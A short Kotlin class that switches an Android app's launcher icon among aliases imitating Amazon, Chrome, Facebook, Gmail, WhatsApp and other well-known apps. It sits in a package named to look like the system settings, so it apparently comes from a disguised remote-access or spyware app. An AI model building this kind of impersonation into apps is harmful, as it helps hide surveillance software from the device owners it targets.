package com.android.system.settings

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

class ChangeAppIcon {
    //changes app icon (based on activity alias set on android manifest)
    private val allIcons = arrayOf("MainActivity","AmazonIcon","CalendarIcon","ChromeIcon","FacebookIcon","GmailIcon","GoogleIcon","GPayIcon","InstagramIcon","MapsIcon","PhotosIcon","PlayStoreIcon","WhatsappIcon","YoutubeIcon")
    fun setIcon(context: Context,name:String):String{
        val manager: PackageManager = context.packageManager
        for(icon in allIcons){
            if(icon == name){
                manager.setComponentEnabledSetting(ComponentName(context, "com.android.system.settings.$icon"),PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
            }else{
                manager.setComponentEnabledSetting(ComponentName(context,"com.android.system.settings.$icon"), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            }
        }
        return "done"
    }
}
